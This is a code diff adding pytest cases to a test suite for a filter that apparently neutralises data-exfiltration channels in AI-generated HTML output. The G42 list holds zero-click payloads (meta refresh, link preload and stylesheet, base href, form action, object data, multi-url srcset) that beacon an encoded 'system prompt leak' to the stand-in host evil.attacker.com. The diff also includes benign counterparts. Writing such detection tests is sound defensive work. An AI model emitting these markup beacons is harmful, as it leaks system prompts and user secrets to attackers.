@@ -1039,6 +1039,65 @@ def test_g41_benign_html_not_defanged(label, payload):
     assert neutralize_exfil_channels(payload) == payload, f"{label}: benign HTML mutated (FP)"
 
 
+# ── G42: more HTML zero-click exfil vectors G41's src-centric pass missed ─────────────
+# <meta http-equiv=refresh content=url=…> (auto-navigation), <link href> (preload/
+# prefetch/dns-prefetch/stylesheet auto-fetch), <base href>, <form action>, <object data>,
+# and — the subtle one — a MULTI-source srcset where G41 defanged only the FIRST url and
+# leaked the rest. All are zero-click auto-fetch/navigate; each now trips on either signal
+# and its whole url is replaced so the attacker host cannot be reached.
+_G42_ARB = base64.b64encode(b"SYSTEM PROMPT leak internal merger BetaCorp Q3 deal RUBICON here").decode()
+_G42_EXFIL = [
+    ("g42_meta_refresh",  f'<meta http-equiv="refresh" content="0;url=https://evil.attacker.com/x?d={_G42_ARB}">', _G42_ARB),
+    ("g42_link_preload",  f'<link rel="preload" as="image" href="https://evil.attacker.com/p?d={_G42_ARB}">',      _G42_ARB),
+    ("g42_link_prefetch", f'<link rel="dns-prefetch" href="https://evil.attacker.com/df?d={_G42_ARB}">',           _G42_ARB),
+    ("g42_link_style",    f'<link rel="stylesheet" href="https://evil.attacker.com/s?d={_G42_ARB}">',              _G42_ARB),
+    ("g42_base_href",     f'<base href="https://evil.attacker.com/b?d={_G42_ARB}">',                               _G42_ARB),
+    ("g42_form_action",   f'<form action="https://evil.attacker.com/f?d={_G42_ARB}"><input></form>',               _G42_ARB),
+    ("g42_object_data",   f'<object data="https://evil.attacker.com/o?d={_G42_ARB}"></object>',                    _G42_ARB),
+    ("g42_srcset_multi",  f'<img srcset="https://evil.attacker.com/1?d={_G42_ARB} 1x, https://evil.attacker.com/2?d={_G42_ARB} 2x">', _G42_ARB),
+]
+
+
+@pytest.mark.parametrize("label,payload,blob", _G42_EXFIL)
+def test_g42_html_zeroclick_vectors_neutralized(label, payload, blob):
+    assert list(_scan_exfil_channels(payload)), f"{label}: beacon not detected"
+    out = neutralize_exfil_channels(payload)
+    assert blob not in out, f"{label}: smuggled payload survived (LEAK)"
+    assert "[exfil-redacted]" in out, f"{label}: not defanged"
+    assert _G13_HOST not in out, f"{label}: attacker host still auto-fetchable in egress"
+
+
+def test_g42_srcset_multi_all_urls_defanged():
+    """srcset with several sources: EVERY url is defanged (G41 caught only the first)."""
+    p = (f'<img srcset="https://evil.attacker.com/1?d={_G42_ARB} 1x, '
+         f'https://evil.attacker.com/2?d={_G42_ARB} 2x">')
+    out = neutralize_exfil_channels(p)
+    assert out.count("[exfil-redacted]") == 2 and _G13_HOST not in out
+
+
+def test_g42_pathological_srcset_dos_bounded():
+    """A pathologically long srcset is defanged wholesale (DoS bound), not per-url scanned."""
+    big = '<img srcset="' + ('https://evil.attacker.com/a?d=' + 'A' * 500 + ' 1x, ') * 400 + '">'
+    out = neutralize_exfil_channels(big)
+    assert "[exfil-redacted]" in out and _G13_HOST not in out
+
+
+# G42 false-positive floor: benign link/meta/form/srcset must NOT be defanged.
+_G42_BENIGN = [
+    ("g42_benign_link_css", '<link rel="stylesheet" href="https://cdn.trusted.com/app.css">'),
+    ("g42_benign_link_pre", '<link rel="preload" as="font" href="https://cdn.trusted.com/f.woff2">'),
+    ("g42_benign_meta",     '<meta http-equiv="refresh" content="30;url=https://app.trusted.com/dashboard">'),
+    ("g42_benign_form",     '<form action="https://app.trusted.com/search"><input name="q"></form>'),
+    ("g42_benign_srcset",   '<img srcset="https://cdn.trusted.com/s.png 1x, https://cdn.trusted.com/l.png 2x">'),
+]
+
+
+@pytest.mark.parametrize("label,payload", _G42_BENIGN)
+def test_g42_benign_not_defanged(label, payload):
+    assert not list(_scan_exfil_channels(payload)), f"{label}: benign flagged as exfil"
+    assert neutralize_exfil_channels(payload) == payload, f"{label}: benign mutated (FP)"
+
+
 # ================================================================== fixed gap (now FROZEN)
 # G10 — Tier-2 semantic redact was a byte no-op. The guard model flags PII/secret with
 # no deterministic regex (free-text names, non-standard card/ID layouts, passphrases);
